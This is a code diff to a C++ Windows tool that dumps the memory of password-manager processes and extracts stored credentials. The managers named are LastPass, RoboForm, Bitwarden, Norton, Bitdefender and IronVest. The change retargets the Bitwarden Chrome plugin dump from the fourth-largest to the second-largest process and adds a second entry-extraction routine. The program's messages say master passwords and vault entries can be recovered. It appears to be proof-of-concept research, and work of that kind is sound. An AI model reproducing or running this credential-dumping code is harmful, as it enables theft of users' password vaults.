@@ -26,6 +26,7 @@
 #include "headers/lastpass/getCredslastpassMasterUsername.h"
 #include "headers/roboform/getCredsroboform.h"
 #include "headers/bitwarden/plugin/getCredsbitwardenPluginChrome.h"
+#include "headers/bitwarden/plugin/getCredsbitwardenPluginChrome2.h"
 #include "headers/norton/getCredsnorton.h"
 #include "headers/bitdefender/getCredsbitdefender.h"
 #include "headers/ironvest/getCredsironvest.h"
@@ -583,7 +584,7 @@ int main() {
     //bitwarden
     if (userInput == "bitwarden") {
         std::cout << "User input matches 'bitwarden'.\n";
-        std::cout << "In this browser plugin, for Chrome the fourth largest process is needed.\n";
+        std::cout << "In this browser plugin, for Chrome the second largest process is needed.\n";
         std::cout << "For Firefox the third largest process is needed.\n";
         std::cout << "In Firefox, all credentials should be available (master pass, entries, etc).\n";
         std::cout << "In Chrome, only entries are available.\n";
@@ -601,17 +602,17 @@ int main() {
             // Step 2: Get Private Working Set sizes for the found PIDs
             std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
 
-            // Step 3: Find the PID with the fourth-largest Private Working Set size
-            DWORD fourthLargestPID = FindFourthPID(pidSizePairs);
+            // Step 3: Find the PID with the second-largest Private Working Set size
+            DWORD secondLargestPID = FindSecondPID(pidSizePairs);
 
-            if (fourthLargestPID != 0)
+            if (secondLargestPID != 0)
             {
-                // Step 4: Create a dump file for the process with the fourth-largest size
-                saveDump(fourthLargestPID);
+                // Step 4: Create a dump file for the process with the second-largest size
+                saveDump(secondLargestPID);
             }
             else
             {
-                std::cerr << "No process with the fourth-largest Private Working Set size found." << std::endl;
+                std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
             }
         }
         else
@@ -619,8 +620,11 @@ int main() {
             std::cerr << "No processes with the specified name found." << std::endl;
         }
 
-        std::cout << "Searching for entries.\n";
+        std::cout << "Searching for entries (1/2).\n";
         getCredsbitwardenPluginChrome();
+        std::cout << "Done!\n";
+        std::cout << "Searching for entries (2/2).\n";
+        getCredsbitwardenPluginChrome2();
         std::cout << "Done!\n";
         std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
     }
